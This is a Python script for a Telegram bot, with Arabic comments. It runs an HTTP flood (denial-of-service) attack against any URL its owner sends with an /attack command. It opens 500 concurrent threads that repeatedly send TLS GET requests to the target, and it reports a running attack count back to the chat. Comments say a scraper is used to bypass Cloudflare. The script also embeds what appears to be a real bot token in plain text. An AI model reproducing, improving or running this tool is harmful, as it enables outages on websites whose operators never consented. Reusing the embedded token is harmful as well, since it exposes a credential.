
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import time
import socket
import ssl

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')

# متغيرات التحكم في الهجوم
attack_in_progress = False
attack_lock = threading.Lock()
attack_counter = 0  # عداد الهجوم

def bypass_attack(host, port=443):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {headers['User-Agent']}\r\n\r\n".encode())
                    attack_counter += 1
    except Exception as e:
        print("حدث خطأ:", e)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_in_progress
    with attack_lock:
        attack_in_progress = False
    bot.reply_to(message, "تم إيقاف الهجوم.")
    bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    global attack_in_progress, attack_counter
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
        host = url.split("//")[-1].split("/")[0]  # استخراج اسم المضيف من الرابط

        with attack_lock:
            attack_in_progress = True
            attack_counter = 0

        bot_message = bot.send_message(message.chat.id, f"الهجوم بدأ على {url}.\nالهجوم مستمر: 0")

        def update_message():
            while attack_in_progress:
                time.sleep(1)  # تحديث كل ثانية
                try:
                    bot.edit_message_text(chat_id=bot_message.chat.id, message_id=bot_message.message_id, text=f"الهجوم مستمر: {attack_counter}")
                except Exception as e:
                    print("حدث خطأ أثناء تحديث الرسالة:", e)

        threading.Thread(target=update_message).start()

        with ThreadPoolExecutor(max_workers=500) as executor:
            for _ in range(500):  # عدد الطلبات يمكن تعديله حسب الحاجة
                if not attack_in_progress:
                    break
                executor.submit(bypass_attack, host)
    else:
        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.reply_to(message, "استخدم /attack <الرابط> لبدء الهجوم أو /stop لإيقاف الهجوم.")

bot.polling()
